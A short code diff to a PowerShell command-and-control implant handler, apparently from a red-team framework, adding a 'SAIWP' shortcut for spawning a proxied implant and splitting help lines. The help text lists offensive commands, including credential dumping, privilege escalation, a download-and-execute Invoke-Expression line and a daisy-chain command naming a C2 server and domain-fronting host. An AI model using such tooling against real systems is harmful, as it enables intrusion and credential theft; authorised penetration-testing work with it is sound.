@@ -130,7 +130,8 @@ function Implant-Handler
         write-host " Dump-Creds"-ForegroundColor Green 
         write-host " Unzip <source file> <destination folder>"-ForegroundColor Green 
         #write-host " Zip <destination zip file> <source folder>"-ForegroundColor Green 
-        write-host " Get-System | Get-System-WithProxy" -ForegroundColor Green 
+        write-host " Get-System" -ForegroundColor Green
+        write-host " Get-System-WithProxy" -ForegroundColor Green 
         write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
         write-host " Get-Pid" -ForegroundColor Green 
         write-host " Get-Webpage http://intranet" -ForegroundColor Green 
@@ -140,7 +141,7 @@ function Implant-Handler
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
-        write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
+        write-host " StartAnotherImplantWithProxy or SAIWP" -ForegroundColor Green 
         write-host " Invoke-DaisyChain -port 80 -daisyserver http://192.168.1.1 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfixes" -ForegroundColor Green 
@@ -1150,7 +1151,7 @@ param
                 $pscommand = 'fvdsghfdsyyh'
                 }
             }         
-            if ($pscommand -eq 'StartAnotherImplantWithProxy') 
+            if (($pscommand -eq 'StartAnotherImplantWithProxy') -or ($pscommand -eq 'saiwp'))
             {
                 if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                 CheckModuleLoaded "proxypayload.ps1" $psrandomuri
